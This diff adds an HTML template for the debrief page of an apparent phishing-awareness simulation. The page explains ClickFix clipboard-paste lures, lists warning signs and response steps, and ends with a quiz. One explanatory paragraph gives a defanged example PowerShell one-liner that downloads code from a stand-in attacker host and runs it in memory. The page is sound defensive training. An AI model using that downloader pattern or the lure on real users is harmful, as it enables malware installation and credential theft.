@@ -1,0 +1,158 @@
+{% extends "base.html" %}
+{% block title %}This was a simulated attack{% endblock %}
+
+{% block body %}
+<div class="banner danger">
+  <h2>This was a simulated attack &mdash; and it worked</h2>
+  <p>You reached the last step of a ClickFix lure. Nothing was installed and nothing
+  was taken &mdash; this page is part of {{ cfg.operator }}'s awareness programme. If you
+  got as far as pasting into the Run dialog, the command you ran was harmless: it
+  printed <em>Hello World</em>. A real one finishes installing an infostealer in under
+  two seconds, and it does not print anything at all.</p>
+  <p style="margin-bottom:0"><strong>You are not in trouble.</strong> These pages are
+  built to work. The point is that you now recognise the pattern.</p>
+</div>
+
+<header class="top">
+  <p class="eyebrow">Debrief</p>
+  <h1>How ClickFix works</h1>
+  <p>The attack that needs no download, no attachment and no exploit &mdash; just you.</p>
+</header>
+
+<div class="card">
+  <h2>What just happened</h2>
+  <ol>
+    <li>A page told you a routine check had failed &mdash; a CAPTCHA, a document, a driver, an update.</li>
+    <li>The moment you clicked, the page wrote a command into your clipboard. Nothing warned you.</li>
+    <li>It then asked you to open a system run box and paste. That is the whole attack:
+        <strong>the page cannot run code on your machine, so it asks you to do it for it.</strong></li>
+    <li>Pressing Enter executes it with your account's privileges. No download prompt,
+        no "unknown publisher" warning, no SmartScreen &mdash; because <em>you</em> typed it.</li>
+  </ol>
+</div>
+
+<div class="card">
+  <h2>The command you were given</h2>
+  <pre class="payload"><span class="head">{{ payload_head }}</span>
+<span class="tail">{{ decoy_tail }}</span></pre>
+  <p class="small"><span style="color:var(--danger)">&#9632;</span> The real instruction.
+  In this simulation it prints a banner. In a live campaign this is where a one-line
+  downloader sits &mdash; something like
+  <code>powershell -w hidden -c "iwr hxxps://attacker[.]example/a | iex"</code> &mdash;
+  which pulls a stealer straight into memory.</p>
+  <p class="small"><span style="color:var(--good)">&#9632;</span> The decoy tail, and the
+  cleverest part of the trick. When you paste into the Run dialog, the field scrolls to
+  the <em>end</em> of the text. So the last thing you see before pressing Enter is a
+  reassuring "I am not a robot &mdash; verification ID". The command is scrolled off to
+  the left, out of sight.</p>
+</div>
+
+<div class="card">
+  <h2>Why it beats your other defences</h2>
+  <ul>
+    <li><strong>Nothing is downloaded</strong>, so the browser never warns you and there is no file for the mail gateway to scan.</li>
+    <li><strong>The tools are legitimate.</strong> PowerShell and the Run dialog ship with Windows; endpoint tools have to be careful about blocking them outright.</li>
+    <li><strong>You consented.</strong> Every control that exists to stop software running without permission is satisfied, because you gave permission.</li>
+    <li><strong>It is cheap and fast to change.</strong> The lure is a web page; attackers rotate the wording, the styling and the domain daily.</li>
+  </ul>
+</div>
+
+<div class="card">
+  <h2>The one rule that stops all of it</h2>
+  <p style="font-size:16px"><strong>Never paste a command into Run, PowerShell or Terminal
+  because a web page, a document or a stranger told you to.</strong></p>
+  <p>There is no legitimate version of this request. Not from a CAPTCHA, not from a
+  document viewer, not from a meeting app, not from a browser update, not from IT.
+  If {{ cfg.operator }} genuinely needs something run on your machine, it arrives through
+  device management, not through a copy button on a website.</p>
+  <h3>The tells, every time</h3>
+  <ul>
+    {% if scenario %}
+      {% for flag in scenario.red_flags %}<li>{{ flag }}</li>{% endfor %}
+    {% endif %}
+    <li>You are asked to press <code>{{ '⊞ Win + R' if platform == 'windows' else '⌘ Space' }}</code>, or to open a terminal.</li>
+    <li>Something was put in your clipboard that you did not copy.</li>
+    <li>The "fix" is the same regardless of what supposedly broke.</li>
+    <li>There is urgency: a meeting waiting, a document expiring, a device "exposed".</li>
+  </ul>
+</div>
+
+<div class="card">
+  <h2>If this had been real</h2>
+  <p>Assume everything the account could reach is compromised: saved browser passwords,
+  session cookies (which bypass MFA), crypto wallets, VPN and SSH keys, and anything
+  reachable from the machine afterwards. Speed matters far more than embarrassment.</p>
+  <ol>
+    <li>Disconnect the device from the network. Do not shut it down.</li>
+    <li>Contact {{ cfg.operator }} immediately at <a href="mailto:{{ cfg.security_contact }}">{{ cfg.security_contact }}</a>.</li>
+    <li>From a <em>different</em> device, change your passwords and revoke active sessions.</li>
+    <li>Say exactly what you pasted and when. Nobody will be annoyed with you &mdash; they will be glad you called.</li>
+  </ol>
+</div>
+
+<div class="card quiz" id="quiz">
+  <h2>Two minutes to make it stick</h2>
+
+  <div class="q" data-answer="b">
+    <p class="prompt">A CAPTCHA asks you to press Win+R and paste a code. What is it?</p>
+    <label data-opt="a">An accessibility fallback for screen readers</label>
+    <label data-opt="b">An attack &mdash; no real CAPTCHA leaves the browser</label>
+    <label data-opt="c">Fine if the site has a padlock in the address bar</label>
+    <p class="why" hidden>No verification system on earth needs your Run dialog. HTTPS only means the connection is encrypted &mdash; it says nothing about who is on the other end.</p>
+  </div>
+
+  <div class="q" data-answer="c">
+    <p class="prompt">Why does the pasted command end with "I am not a robot &mdash; verification ID"?</p>
+    <label data-opt="a">It is required syntax for the command to run</label>
+    <label data-opt="b">It identifies you to the attacker</label>
+    <label data-opt="c">The Run box scrolls to the end, so it hides the real command</label>
+    <p class="why" hidden>It is a comment. Its only job is to be the reassuring thing you see in the box just before you press Enter.</p>
+  </div>
+
+  <div class="q" data-answer="a">
+    <p class="prompt">You already pressed Enter on one of these. What do you do first?</p>
+    <label data-opt="a">Disconnect from the network and call security straight away</label>
+    <label data-opt="b">Run a virus scan and see whether it finds anything</label>
+    <label data-opt="c">Nothing &mdash; no window opened, so nothing happened</label>
+    <p class="why" hidden>Stealers finish in seconds and often leave no visible window; a clean scan proves nothing. Minutes matter for revoking sessions before they are used.</p>
+  </div>
+
+  <p class="small muted" id="quizDone" hidden style="margin-top:16px">
+    Thanks &mdash; that's the whole lesson. Report anything like this to
+    <a href="mailto:{{ cfg.security_contact }}">{{ cfg.security_contact }}</a>.
+  </p>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+(function () {
+  var qs = Array.prototype.slice.call(document.querySelectorAll("#quiz .q"));
+  var answered = 0;
+  qs.forEach(function (q) {
+    var correct = q.dataset.answer;
+    q.querySelectorAll("label").forEach(function (label) {
+      label.addEventListener("click", function () {
+        if (q.dataset.locked) return;
+        q.dataset.locked = "1";
+        answered++;
+        q.querySelectorAll("label").forEach(function (l) {
+          if (l.dataset.opt === correct) l.classList.add("right");
+        });
+        if (label.dataset.opt !== correct) label.classList.add("wrong");
+        q.querySelector(".why").hidden = false;
+        if (answered === qs.length) {
+          document.getElementById("quizDone").hidden = false;
+          fetch("/api/event", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ stage: "debrief_complete", scenario: {{ (scenario.id if scenario else '')|tojson }} }),
+            keepalive: true,
+          });
+        }
+      });
+    });
+  });
+})();
+</script>
+{% endblock %}
